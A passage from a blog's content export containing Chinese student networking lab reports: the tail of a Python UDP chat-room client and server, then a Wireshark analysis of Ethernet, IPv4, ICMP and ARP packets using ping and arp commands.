    </span><br><span class="line">        <span class="comment">#首先进行服务器连接检测</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sendto(self.__name.encode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>), self.__address)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            print(<span class="string">"----------服务器连接失败----------"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#客户名合法性检测    </span></span><br><span class="line">        name_verify = self.recv(BUFSIZE).decode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> name_verify == <span class="string">"error"</span>:</span><br><span class="line">            name=input(<span class="string">"该昵称已被用，请重新输入："</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="string">'\\'</span> <span class="keyword">in</span> name <span class="keyword">or</span> <span class="string">'|'</span> <span class="keyword">in</span> name:</span><br><span class="line">                name = input(<span class="string">"昵称存在非法字符，请重新输入："</span>)</span><br><span class="line">            self.sendto(name.encode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>), self.__address)</span><br><span class="line">            self.__name = name</span><br><span class="line">            name_verify = self.recv(BUFSIZE).decode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>)</span><br><span class="line">        </span><br><span class="line">        t=threading.Thread(target=self.recv_msg)<span class="comment">#创建另一个线程使得发送消息和接收消息不冲突</span></span><br><span class="line">        t.start()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            word=input().strip()<span class="comment">#发送消息</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> word:</span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># 避免回车导致服务器的死循环</span></span><br><span class="line">            self.send_msg(word)</span><br><span class="line">            <span class="keyword">if</span> word == <span class="string">"exit"</span>:</span><br><span class="line">                self.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(self,word)</span>:</span></span><br><span class="line">        <span class="string">'''该函数用于向客户端发送消息，消息包括用户名和实际内容，用'|'隔开'''</span></span><br><span class="line">        </span><br><span class="line">        data = (self.__name + SPLIT + word).encode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>)</span><br><span class="line">        self.sendto(data, self.__address)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_msg</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''该函数用于接收来自服务端的消息'''</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                msg = self.recv(BUFSIZE)</span><br><span class="line">                self.show_msg(msg)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> ConnectionResetError <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">"----------服务器连接失败----------"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> OSError <span class="keyword">as</span> f:</span><br><span class="line">                print(<span class="string">"----------连接关闭----------"</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_msg</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        <span class="string">'''该函数用于向该客户展示信息内容，其中不显示客户自己发的信息'''</span></span><br><span class="line">        name, word = data.decode(encoding=<span class="string">'UTF-8'</span>,errors=<span class="string">'ignore'</span>).split(SPLIT)</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'Broadcast'</span><span class="keyword">or</span> name == <span class="string">'Unicast'</span>:</span><br><span class="line">            print(word,<span class="string">'\n\n'</span>)</span><br><span class="line">        <span class="keyword">elif</span> name!=self.__name:</span><br><span class="line">            print(<span class="string">"%s : %s"</span>%(name, word))</span><br></pre></td></tr></table></figure></div>
<p>以下是服务端和客户端</p>
<h4 id="new-server-py"><a href="#new-server-py" class="headerlink" title="new_server.py"></a>new_server.py</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> server <span class="keyword">import</span> Server</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''用于查询本机ip地址，返回值为ip'''</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">'8.8.8.8'</span>, <span class="number">80</span>))</span><br><span class="line">        ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ip = get_host_ip()</span><br><span class="line">    print(<span class="string">'服务器的ip：%s'</span>%ip)</span><br><span class="line">    port = int(input(<span class="string">'请输入要绑定的端口号：'</span>))</span><br><span class="line">    s = Server(serv_address = (ip,port))</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"user.txt"</span>,<span class="string">'r+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.truncate()<span class="comment">#清空user.txt</span></span><br><span class="line">    s.start()</span><br></pre></td></tr></table></figure></div>
<h4 id="new-client-py"><a href="#new-client-py" class="headerlink" title="new_client.py"></a>new_client.py</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> client <span class="keyword">import</span> Client</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ip = input(<span class="string">'请输入服务器的ip：'</span>)</span><br><span class="line">    port = int(input(<span class="string">'请输入服务器绑定的端口号：'</span>))</span><br><span class="line">    print(<span class="string">'-----欢迎来到聊天室，退出聊天室请输入 “exit”-----'</span> )</span><br><span class="line">    name = input(<span class="string">"输入你的昵称: "</span>)</span><br><span class="line">    c = Client(name = name, address = (ip,port))</span><br><span class="line">    c.start()</span><br></pre></td></tr></table></figure></div>
<h4 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h4><p>在Windows环境下运行服务端和客户端代码</p>
<p>启动服务器以及本地一个客户端</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212631558.png" alt="image-20200322212631558"></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212638517.png" alt="image-20200322212638517"></p>
<p>另一台机子上进行客户端登录</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212645982.png" alt="image-20200322212645982"></p>
<p>用户名重复</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212651589.png" alt="image-20200322212651589"></p>
<p>用户退出</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212658430.png" alt="image-20200322212658430"></p>
<p>捕捉的异常（服务器突然关闭）</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212704304.png" alt="image-20200322212704304"></p>
<h1 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h1><p>  本次实验课我通过了对socket编程的学习与运用，进一步加深了对传输层TCP和UDP传输协议的理解与认识。通过使用netstat命令，观察端口的使用状态，对于实验中产生的各种现象，可以通过TCP有限状态机图对其进行分析和理解。本次关于编程的实验我遇到不少疑难杂症，但是通过观察实验现象、上网查资料等方法均得到一一解决。此次实验收获良多，但在对代码的debug能力仍有不足，今后会加强这一方面的学习。</p>
]]></content>
      <categories>
        <category>计算机网络通信实验</category>
      </categories>
  </entry>
  <entry>
    <title>计网实验——数据帧和IP包分析</title>
    <url>/posts/287ca37a/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
<li>捕获和分析网络数据</li>
<li>掌握以太网MAC帧、802.11数据帧和IPv4数据包的构成，了解字段含义</li>
<li>掌握ICMP和ARP协议的请求/响应机理</li>
<li>掌握ping、arp和tracert指令<a id="more"></a></li>
</ul>
<h1 id="实验内容与分析"><a href="#实验内容与分析" class="headerlink" title="实验内容与分析"></a>实验内容与分析</h1><h2 id="任务1：Wireshark抓包"><a href="#任务1：Wireshark抓包" class="headerlink" title="任务1：Wireshark抓包"></a>任务1：Wireshark抓包</h2><p> 作者使用window10的系统，安装wireshark3.0.3进行抓包。</p>
<h3 id="过滤器的使用"><a href="#过滤器的使用" class="headerlink" title="过滤器的使用"></a>过滤器的使用</h3><p>① 过滤特定端口<br>tcp.port eq 80 ：显示源端口或目的端口为80的报文<br>tcp.srcport eq 80：显示源端口为80的报文<br>tcp.dstport eq 55332：显示目的端口为55332的报文<br>②按长度进行过滤<br>tcp.len &gt;0：过滤具有有效载荷的tcp报文<br>udp.length == 26 ：过滤长度为26字节的udp包<br>ip.len eq 1500 ：过滤长度为1500字节的IP数据包。<br>frame.len le 128: 过滤数据帧总体长度小于128B的记录<br>③过滤IP地址<br>ip.src eq 192.168.1.107 ：按源IP地址过滤的数据包<br>ip.dst eq 192.168.1.107 ：按目的IP地址过滤的数据包<br>ip.addr eq 192.168.1.107：不区分源和目的IP地址过滤的数据包<br>④过滤包含特定字符串域名的报文，如：http.host contains “xmu”<br>⑤多个过滤条件，例如满足http以及且端口为80的过滤规则 ：http &amp;&amp; tcp.port == 80<br>PS：<br>1.此处tcp数据包长度+tcp头部（20）+ip头部(20)+以太网头部（14）=整体数据帧的长度。<br>2.此处udp数据包长度+ip头部长度（20）+以太网头部（14）=整体数据帧的长度。<br>3.此处ip数据包长度+以太网头(14)=整体数据帧的长度。<br>4.在组合表达式中使用“!=”操作符，像eth.addr,ip.addr,tcp.port,udp.port等元素可能会产生非预期效果。<br>5.MAC层地址的过滤是同样的道理<br>6.组合符号有and&amp;&amp; 且 or,||,或 not,! 取反这几种。</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204719904.png" alt="image-20200322204719904"></p>
<p>在上图的数据包中，我发现有不少数据帧是小于60字节的(MAC帧尾部4字节已被网络设备过滤)，但是我们知道Wireshark是工作在数据链路层的，在以太网传输的最小帧长度为64字节，这显然与课上所学不符。查阅相关网络资料得到解答</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204753951.png" alt="image-20200322204753951"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204809793.png" alt="image-20200322204809793"></p>
<p>由于Wireshark在传输帧离开主机进入网络适配器之前就捕获了传输帧，此时的帧并未经过填充至64字节进入以太网，因此可能会捕获到小于60字节的数据帧，并且抓到的数据帧中只有本机发送的数据帧可能会小于60字节，而接收的数据帧一定不会小于60字节。</p>
<h2 id="任务2：捕获分析以太网MAC帧和IPv4数据包"><a href="#任务2：捕获分析以太网MAC帧和IPv4数据包" class="headerlink" title="任务2：捕获分析以太网MAC帧和IPv4数据包"></a>任务2：捕获分析以太网MAC帧和IPv4数据包</h2><p> 通过ping内网和外网，从捕获的数据包来分析以太网MAC帧和IPv4数据包 </p>
<p>ping 的实质：发送一个icmp回显请求报文给目的的主机，并等待回显的icmp应答。然后打印出回显报文。回显的结果包括：字节数、反应时间、TTL（生存时间）</p>
<p>ping的功能如下图</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204820969.png" alt="image-20200322204820969"></p>
<h3 id="任务要求："><a href="#任务要求：" class="headerlink" title="任务要求："></a>任务要求：</h3><p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204828688.png" alt="image-20200322204828688"></p>
<p>一、内网</p>
<p>(1)首先查看本机的ip地址，再使用ipscan查看当前局域网内有哪些主机可以ping通</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204857746.png" alt="image-20200322204857746"></p>
<p>可知本机ip是192.168.2.180，子网掩码为255.255.255.0，则子网为192.168.2.0</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204910870.png" alt="image-20200322204910870"></p>
<p>（1）局域网内另一台主机ip为192.168.2.102 &lt;/br&gt;通过以下代码ping通该主机</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">ping 192.168.2.102 -t</span><br></pre></td></tr></table></figure></div>
<p>同时打开wireshark捕获数据包</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204923503.png" alt="image-20200322204923503"></p>
<p>（2）可以看到图中共有5对ICMP请求帧和回应帧&lt;/br&gt;用以下语句过滤得到ICMP报文</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">icmp</span><br></pre></td></tr></table></figure></div>
<p>（3）①</p>
<p>1°观察第一个编号为1的Echo (ping) request 数据帧 </p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204949289.png" alt="image-20200322204949289"></p>
<p>如上图所示，这个数据帧的结构如下</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Ethernet II</th>
</tr>
</thead>
<tbody>
<tr>
<td>IP</td>
</tr>
<tr>
<td>ICMP</td>
</tr>
</tbody>
</table>
</div>
<p>2°进一步观察Ethernet II（MAC帧）的内容</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322204958262.png" alt="image-20200322204958262"></p>
<p>其数据帧格式如下</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>目的地址</th>
<th>源地址</th>
<th>类型</th>
<th>数据</th>
<th>FCS</th>
</tr>
</thead>
<tbody>
<tr>
<td>6</td>
<td>6</td>
<td>2</td>
<td>46~1500</td>
<td>4</td>
</tr>
</tbody>
</table>
</div>
<p>图中：<br>Destination: 代表目的MAC地址，有6个字节，图中目的MAC地址为a0:86:c6:8c:da:d5<br>Source: 代表源MAC地址，有6个字节，图中源MAC地址we为3c:a0:67:16:06:f3<br>Type: 代表类型，有2个字节，图中类型值为0x0800，代表类型为IPv4<br>Data: wireshark将数据解析在下一层<br>FCS:  表示帧校验序列，有 4 个字节，用于校验帧是否出错。该字段内容已被网络设备滤去，抓包软件已无法获取</p>
<p>3°观察IP数据报的内容</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205009186.png" alt="image-20200322205009186"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205024843.png" alt="image-20200322205024843"></p>
<p>图中：<br>Version:版本号，占4位，4,代表IPv4<br> Header Length:首部长度，占4位，5, 表示 5 个以 <strong>32 bit</strong> 为单位的字，即 20 bytes<br> Differentiated Services Field:区分服务，占8位<br>Total Length:总长度,占16位，最大为$2^{16}-1=65535$字节，图中为60字节<br>Identification:标识，占16位<br>Flags:标志(占3位)和片位移(占13位)，共占16字节，其中标识中MF=1标识后面“还有分片”的数据报，MF=0表示这已是若干数据报片中的最后一个。DF意思是“不能分片”，当DF=1才允许分片。片位移以8个字节（64位）为偏移单位。<br>Time to live:生存时间，占8位，TTL<br>Protocol:协议，占8位，图中1代表ICMP<br>Header checksum:首部校验和，占16位，只检验数据报的首部，但不包括数据部分。<br>Source:源地址，占32位，图中为192.168.2.180<br>Destination:目的地址，占32位，图中为192.168.2.102</p>
<p>4°观察ICMP数据报的内容</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205034914.png" alt="image-20200322205034914"></p>
<p>其数据帧格式如下</p>
<p><style><br>    th,td<br>    {<br>        text-align:center;<br>    }
</style></p>
<table>
    <col style="width: 25%">
    <col style="width: 25%">
    <col style="width: 50%">
  <tr>
      <th>0~7</th>
      <th>8~15</th>
      <th colspan="2">16~31</th>
  </tr>
  <tr>
    <td>类型</td>
    <td>代码</td>
    <td colspan="2">检验和</td>
  </tr>
  <tr>
    <td colspan="2">标识符</td>
    <td>序列号</td>
  </tr>
  <tr>
     <td colspan="3">数据</td>
  </tr>
</table>


<p>图中：<br>Type：类型，占8位，包括差错报告报文（3：终点不可达，11：时间超过，12：参数问题，5：改变路由）和询问报文（8或0：回送（Echo）请求或回答，13或14：时间戳请求或回答），图中类型值为8，PING请求<br>Code：代码，占8位，是为了进一步区分某种类型中的几种不同情况<br>Checksum：校验和，占16位，用于检验整个ICMP报文<br>Identifier：标识符， 占8位用于匹配 Request/Reply 的标识符。<br>Sequence number：序列号， 占8位，用于匹配 Request/Reply 的序列号 <br>Data :数据 </p>
<p>可以注意到，上面图中标识符有<strong>BE</strong>和<strong>LE</strong>两种，具体什么意思呢？</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205048138.png" alt="image-20200322205048138"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205055034.png" alt="image-20200322205055034"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205102930.png" alt="image-20200322205102930"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205112285.png" alt="image-20200322205112285"></p>
<p>由上面四张图可以看出，标识符和序列号的BE和LE对应的是相同的内容，但是读写顺序不一样，于是到WireShark官网查看解释<a href="https://www.wireshark.org/lists/wireshark-bugs/200909/msg00439.html，发现这样一段话">https://www.wireshark.org/lists/wireshark-bugs/200909/msg00439.html，发现这样一段话</a></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205125041.png" alt="image-20200322205125041"></p>
<p>由此可知， wireshark考虑到window系统与Linux系统发出的ping报文（主要指ping应用字段而非包含IP头的ping包）的字节顺序不一样 ，<strong>BE表示linux系统的big-endian（大头位序）</strong>，<strong>LE表示Windows系统的小头位序</strong>， 开发者将其分别显示出来 。</p>
<p>②</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205136268.png" alt="image-20200322205136268"></p>
<p>由图可知MAC帧长度为<strong>74字节</strong>但是这个长度并不包括FCS（4个字节，已被网络设备滤去，抓包软件已无法获取），因此实际长度为<strong>78字节</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205246938.png" alt="image-20200322205246938"></p>
<p>由上图可知IP数据报长度为<strong>60字节</strong>，二者关系为：IP数据报是属于MAC帧的数据部分，如下图所示</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205256793.png" alt="image-20200322205256793"></p>
<p>（4）比较ICMP请求帧和回应帧的结构和IP头部字段的变化 </p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205313252.png" alt="image-20200322205313252"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205351873.png" alt="image-20200322205351873"></p>
<p>从上图可知ICMP请求帧和回应帧的结构相同，但是在内容上，目的地址和源地址交换，ICMP报文的Type和Checksum不同。<br>观察IP数据报首部</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205359693.png" alt="image-20200322205359693"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205407875.png" alt="image-20200322205407875"></p>
<p>从上面两张图可以发现Identification（标识符）、 Header Checksum（首部校验和）、Source（源地址）、 Destination（目的地址）发生了变化</p>
<p>二、外网</p>
<p>我们选择下面的命令Ping外网</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com -t</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205417907.png" alt="image-20200322205417907"></p>
<p>经过观察发现ping外网和ping内网的得到的ICMP帧在结构上并无太大区别</p>
<p> 三、改变ping包的大小，观察IP数据包分片  </p>
<p>使用下面的命令  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">ping 192.168.2.102 -t -l 4000</span><br><span class="line">ping 192.168.2.102 -t -l 10000</span><br><span class="line">ping 192.168.2.102 -t -l 20000</span><br><span class="line">ping 192.168.2.102 -t -l 65500</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205432789.png" alt="image-20200322205432789"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205440125.png" alt="image-20200322205440125"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205448653.png" alt="image-20200322205448653"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205503865.png" alt="image-20200322205503865"></p>
<p>可见一个帧的MTU值为1500（1480+20）字节  </p>
<p>可以注意到显示的ICMP帧内有所有的分片，以第一张图为例，然而ICMP帧的长度为1082字节，却有4008字节的IP数据报，这显然不合常理，后研究发现，这只是因为wireshark的人性化显示方式，将其他IP帧放在一起显示。</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205512820.png" alt="image-20200322205512820"></p>
<p>查看IPv4协议帧和ICMP协议帧的结构</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205521457.png" alt="image-20200322205521457"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205531927.png" alt="image-20200322205531927"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205539334.png" alt="image-20200322205539334"></p>
<p>经过分析，我做出以下推断：<br>①ICMP报文是放在IP数据报里的，在ping指令中的-l，其发送的数据字节数并不包括ICMP首部的8个字节，是指ICMP报文的数据总长度<br>②ICMP报文分片是从包含ICMP首部的部分开始分片的，wireshark抓到的包ICMP协议显示在最后收到只是WireShark的显示问题。<br>③ping命令发送和接受的ICMP报文内部填充数据是“a-w”23个字母的循环填充。</p>
<p>接着尝试ping外网的大数据包  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com -l 1472</span><br><span class="line">ping www.baidu.com -l 1473</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205627168.png" alt="image-20200322205627168"></p>
<p>发现如上图的异常，查阅相关资料得知百度网站这是百度网站设置的拒绝服务，PING1500字节以上被baidu.com认为是PING洪水攻击，对于其有可能造成瘫痪，因此拒绝返回ICMP报文，但是图中在1473字节便拒绝服务，这是为什么呢？  </p>
<p>我使用以下两条命令得到测试结果，其中-f表示在数据包中设置“不分段”标记(仅适用于 IPv4)。 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ping 4399.com -l 1472 -f</span><br><span class="line">ping 4399.com -l 1473 -f</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205639411.png" alt="image-20200322205639411"></p>
<p>在前文笔者提到，ping的-l只表示ICMP报文的数据部分长度，并不包括ICMP报文的首部8个字节和IP数据报的首部20个字节，由于MTU为1500，因此ping在不分片的情况下-l参数最大为1500-8-20=1472字节</p>
<p>作为对比，笔者ping如下另外两个外网IP，均无异常</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205649060.png" alt="image-20200322205649060"></p>
<h2 id="ARP协议工作原理分析"><a href="#ARP协议工作原理分析" class="headerlink" title="ARP协议工作原理分析"></a>ARP协议工作原理分析</h2><p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205725388.png" alt="image-20200322205725388">首先使用arp –d命令，清空本机已有的ARP缓存</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">arp -d</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205749760.png" alt="image-20200322205749760"></p>
<p>产生如上错误，是因为权限不够<br>到C:\Windows\System32右键<strong>使用管理员身份</strong>运行cmd.exe，成功清空本机已有的ARP缓存</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205759719.png" alt="image-20200322205759719"></p>
<p>接着发起PING命令，浏览网站等网络活动，抓取到一系列包</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205808418.png" alt="image-20200322205808418"></p>
<p>上面红框内是一对arp协议<br>首先观察MAC帧</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205816587.png" alt="image-20200322205816587"></p>
<p>上面可以发现与ICMP协议数据报的两点不同：Type是ARP以及多了Trailer这一项</p>
<p> Trailer这一项是指附加数据。在以太网中，每个数据包最小是64字节。如果数据包不足64字节，就会由网卡进行填充。由于填充的部分不属于实际数据，就会被Wireshark单独解析出来，以Trailer字段进行表示，称为附加数据。附加数据虽然只是为了格式需要，但也可以用来传递数据，如传递协议不支持的数据。 </p>
<p>接着观察arp数据报</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205828009.png" alt="image-20200322205828009"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205837277.png" alt="image-20200322205837277"></p>
<p>Arp报文总共占了28个字节</p>
<p>Hadware type:硬件类型，占2字节，表示ARP报文可以在哪种类型的网络上传输，值为1时表示为以太网地址。<br>Protocol:上层协议类型，占2字节，表示硬件地址要映射的协议地址类型，映射IP地址时的值为0x0800。<br>Hardware size：MAC地址长度，占1字节，标识MAC地址长度，以字节为单位，此处为6。<br>Protocol size：IP协议地址长度：占1字节，标识IP得知长度，以字节为单位，此处为4。<br>Opcode：操作类型：占2字节，指定本次ARP报文类型。1标识ARP请求报文，2标识ARP应答报文。<br>Sender MAC address：源MAC地址，占6字节，标识发送设备的硬件地址。<br>Sender IP address：源IP地址，占4字节，标识发送方设备的IP地址。<br>Target MAC address：目的MAC地址，占6字节，表示接收方设备的硬件地址，在请求报文中该字段值全为0，即00-00-00-00-00-00，表示<strong>任意地址</strong>，因为现在不知道这个MAC地址。<br>Target IP address：目的IP地址，占4字节，表示接受方的IP地址。</p>
<p>图中共有两种ARP报文: ARP请求报文和ARP回复报文 </p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205851066.png" alt="image-20200322205851066"></p>
<p>如上图是ARP请求报文，既有广播又有单播，当为广播时，其目的是发送到每一个IP地址，以得到命中IP地址关于其MAC地址的回应，当为单播时，其为ARP请求确认报文，如下图</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205857831.png" alt="image-20200322205857831"></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205903379.png" alt="image-20200322205903379"></p>
<p>从上图可以看到，经常有这种“明知故问”的arp单播请求报文，而且还会重复发多次，这是为什么呢？查阅相关资料</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205912900.png" alt="image-20200322205912900"></p>
<p>ARP对于高速缓存中的每一个映射地址项目都有设置有生存时间，凡超过生存时间就从高速缓存中删掉。从<a href="https://www.cnblogs.com/lipx9527/p/9436019.html找到以下答案">https://www.cnblogs.com/lipx9527/p/9436019.html找到以下答案</a> </p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205920121.png" alt="image-20200322205920121"></p>
<p>对于ARP回复报文，wireshark捕获到两种:arp单播回复报文和arp广播回复报文</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205926963.png" alt="image-20200322205926963"></p>
<p>上图是ARP单播回复报文，其作用是告诉目的IP自己的MAC地址</p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205935732.png" alt="image-20200322205935732"></p>
<p>上图是ARP广播回复报文，其目的是：主动告诉广播域里的其它主机，IP= 10.30.0.1 对应的MAC = 04:40:a9:68:82:01，其它主机都会将这个对应关系缓存（Cache）下来，即ARP Table Cache，这样可以避免别的主机和10.30.0.1 通信时，事先还需要先ARP广播请求，大大减少ARP广播。下图源自<a href="https://blog.csdn.net/bobozai86/article/details/82693339">https://blog.csdn.net/bobozai86/article/details/82693339</a></p>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322205948828.png" alt="image-20200322205948828">分别ping同一局域网的计算机和局域网外的计算机<br>使用以下命令ping内网 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">ping 10.30.27.181</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/287ca37a/image-20200322210001977.png" alt="image-20200322210001977"></p>
<p>可以得到一对单播请求和回复报文</p>
<p>使用下列命令ping外网</p>
